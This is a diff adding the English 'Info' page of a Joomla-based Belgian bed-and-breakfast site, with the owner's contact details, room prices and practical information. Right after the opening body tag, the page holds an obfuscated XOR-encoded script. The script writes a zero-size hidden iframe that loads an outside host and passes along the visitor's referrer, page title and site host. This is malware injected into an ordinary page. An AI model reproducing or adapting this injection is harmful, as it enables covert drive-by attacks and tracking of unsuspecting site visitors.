@@ -1,0 +1,115 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-gb" lang="en-gb" >
+<head>
+	  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="robots" content="index, follow" />
+  <meta name="keywords" content="" />
+  <meta name="title" content="Info" />
+  <meta name="author" content="Administrator" />
+  <meta name="description" content="" />
+  <meta name="generator" content="Joomla! 1.5 - Open Source Content Management" />
+  <title>Info</title>
+  <link href="/templates/google_grijs/favicon.ico" rel="shortcut icon" type="image/x-icon" />
+  <script type="text/javascript" src="/media/system/js/mootools.js"></script>
+  <script type="text/javascript" src="/media/system/js/caption.js"></script>
+
+	
+<link rel="shortcut icon" href="/images/favicon.ico" />
+<link rel="stylesheet" href="/templates/system/css/general.css" type="text/css" />
+<link href="/templates/google_grijs/css/template.css" rel="stylesheet" type="text/css" />
+<link href="/templates/google_grijs/css/rokslidestrip.css" rel="stylesheet" type="text/css" />
+<link href="/templates/google_grijs/css/light.css" rel="stylesheet" type="text/css" />
+<link href="/templates/google_grijs/css/menustyle3-light.css" rel="stylesheet" type="text/css" />
+
+<style type="text/css">
+	div.wrapper { margin: 0 auto; width: 962px;padding:0;}
+	/* clear fixes for pure css layout */
+	</style>	
+<script type="text/javascript" src="/templates/google_grijs/js/rokslidestrip.js"></script>
+<script type="text/javascript" src="/templates/google_grijs/js/rokfonts.js"></script>   
+<script type="text/javascript">
+	window.addEvent('load', function() {
+		var modules = ['module','module-menu','module-color1','module-color2','module-color3','module-color4','module-style1','module-style1-color1','module-style1-color2','module-style1-color3','module-style1-color4','module-style2','module-style2-color1','module-style2-color2','module-style2-color3','module-style2-color4'];
+		var header = "h3";
+			    RokBuildSpans(modules, header);
+        	});
+</script>
+	
+<!--[if IE]>
+<script type="text/javascript" src="/templates/google_grijs/js/ie_suckerfish.js"></script>
+<![endif]-->
+ <link rel="stylesheet" href="/templates/system/css/system.css" type="text/css" /> 
+ <link rel="stylesheet" href="/templates/system/css/general.css" type="text/css" /> 
+ <link rel="stylesheet" href="/templates/google_grijs/css/template.css" type="text/css" /> 
+ 
+ <link id="JTKLocalCss" href="/css/template.css" rel="stylesheet" type="text/css" />
+ <link href="/templates/google_grijs/css/kringelhof.css" rel="stylesheet" type="text/css" />
+</head>
+
+<body class="oneColFixCtrHdr">
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+
+<div id="container">
+  <div id="header">
+      <img src="/templates/google_grijs/images/logokringelhof.jpg" width="400" height="50" /></div>
+  <div id="mainContent">
+    				<div id="horiz-menu" class="splitmenu menustyle3">
+						<div id="horiz-menu2">
+															<ul class="menutop"><li class="item1"><a href="http://www.kringelhof.be/"><span>Welcome</span></a></li><li class="item53"><a href="/index.php?option=com_content&amp;view=article&amp;id=45&amp;Itemid=53&amp;lang=en"><span>The house</span></a></li><li class="item54"><a href="/index.php?option=com_content&amp;view=article&amp;id=46&amp;Itemid=54&amp;lang=en"><span>Blue Room</span></a></li><li class="item55"><a href="/index.php?option=com_content&amp;view=article&amp;id=47&amp;Itemid=55&amp;lang=en"><span>Red Room</span></a></li><li class="item56"><a href="/index.php?option=com_content&amp;view=article&amp;id=48&amp;Itemid=56&amp;lang=en"><span>Garden</span></a></li><li class="item57"><a href="/index.php?option=com_content&amp;view=article&amp;id=49&amp;Itemid=57&amp;lang=en"><span>Environment</span></a></li><li class="item58"><a href="/index.php?option=com_content&amp;view=article&amp;id=50&amp;Itemid=58&amp;lang=en"><span>Entertainment</span></a></li><li id="current" class="active item59"><a href="/index.php?option=com_content&amp;view=article&amp;id=51&amp;Itemid=59&amp;lang=en"><span>Info</span></a></li><li class="item60"><a href="/index.php?option=com_rsbook_15&amp;Itemid=60&amp;lang=en"><span>Contact</span></a></li></ul>								
+						</div>
+					</div>
+ <div id="fotos">
+    <table width="100%" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td>
+<span style="color: #000000; font-family: Arial; font-size: 11px; line-height: normal" class="Apple-style-span">{mosmap}</span></td>
+  </tr>
+</table></div>
+
+    
+    
+ 	<br />
+    
+<table class="contentpaneopen">
+
+
+
+<tr>
+<td valign="top">
+    <table border="0" width="960"><tbody><tr><td valign="top" style="width: 26%"><strong>CONTACT</strong><br /><br />Francine Van Asbroeck<br />Smid Lambrechtstraat 1<br />9406 Outer - België<br />Tel. 054 320587<br />Mobile 0474 426 437<br />Mail. 
+ <script language='JavaScript' type='text/javascript'>
+ <!--
+ var prefix = 'm&#97;&#105;lt&#111;:';
+ var suffix = '';
+ var attribs = '';
+ var path = 'hr' + 'ef' + '=';
+ var addy43810 = 'fr&#97;nc&#105;n&#101;' + '&#64;';
+ addy43810 = addy43810 + 'kr&#105;ng&#101;lh&#111;f' + '&#46;' + 'b&#101;';
+ document.write( '<a ' + path + '\'' + prefix + addy43810 + suffix + '\'' + attribs + '>' );
+ document.write( addy43810 );
+ document.write( '<\/a>' );
+ //-->
+ </script><script language='JavaScript' type='text/javascript'>
+ <!--
+ document.write( '<span style=\'display: none;\'>' );
+ //-->
+ </script>This e-mail address is being protected from spambots. You need JavaScript enabled to view it
+ <script language='JavaScript' type='text/javascript'>
+ <!--
+ document.write( '</' );
+ document.write( 'span>' );
+ //-->
+ </script></td><td valign="top" style="width: 42%"> <strong>PRICES</strong><br /><br />€ 90 for 2 person / night, breakfast included <br />€ 75 for 1 person / night, breakfast included <br /><br />Reduction of 10% from 1 week (6 nights) <br />Reduction of 20% from 2 weeks (13 nights) <br /><br />Check the prices for even longer periods. <br />Payment in cash for less than 2 weeks.</td><td valign="top" style="width: 33%"><strong>PRACTICAL</strong><br /><br />Parking in the courtyard. <br />Bicycle in the garage. <br />Cot on request. <br /><br />Our recommendations in Belgium:<br /><a href="http://www.casabo.be" target="_blank">www.casabo.be</a> (Wallonie)<br /><a href="http://www.loftkala.be" target="_blank">www.loftkala.be</a> (Brussel)<br /> </td></tr><tr><td> </td><td> </td><td> </td></tr><tr><td> </td><td> </td><td> </td></tr><tr><td> </td><td> </td><td> </td></tr><tr valign="bottom"><td align="left" valign="bottom" style="width: 20%"> </td><td align="left" valign="bottom" style="width: 33%"> </td><td align="left" valign="bottom" style="width: 33%"> </td></tr><tr><td colspan="3" valign="bottom"><p><a href="http://www.bedandbreakfastflanders.be"><img src="http://www.bedandbreakfastflanders.be/images/stories/bedandbreakfastklein.gif" border="0" alt="bed and breakfast belgium directory" width="179" height="46" align="left" /></a><a href="http://www.weekendhotel.be" target="_blank"><img src="http://www.weekendhotel.nl/images/banner_favoriet_be.gif" border="0" alt="hotel en bed and breakfast gids" hspace="5" width="127" height="46" align="left" /></a><a href="http://www.bbguide.eu/owner/register/772/"><img src="http://www.bbguide.eu/assets/images/affliate-NL.png" border="0" align="right" /></a></p></td></tr></tbody></table></td>
+</tr>
+
+</table>
+<span class="article_separator">&nbsp;</span>
+
+
+    <!-- end #mainContent --></div>
+  <div id="footer">
+    <p></p>
+    <!-- end #footer --></div>
+<!-- end #container --></div>
+</body>
+</html>
